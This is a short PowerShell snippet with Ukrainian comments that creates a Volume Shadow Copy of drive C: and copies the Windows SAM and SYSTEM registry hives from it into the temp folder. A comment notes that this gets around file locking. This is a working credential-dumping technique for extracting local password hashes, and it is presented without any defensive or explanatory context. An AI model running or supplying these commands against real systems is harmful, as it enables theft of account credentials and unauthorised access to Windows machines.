# Створюємо символьне посилання на "тіньову копію" диска C:
$s1 = (gwmi -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
$s2 = (gwmi Win32_ShadowCopy | Where-Object { $_.ID -eq $s1.ShadowID }).DeviceObject

# Тепер копіюємо файли безпосередньо з тіньової копії (минаючи блокування)
cmd /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM $env:TEMP\sam.save"
cmd /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM $env:TEMP\system.save"
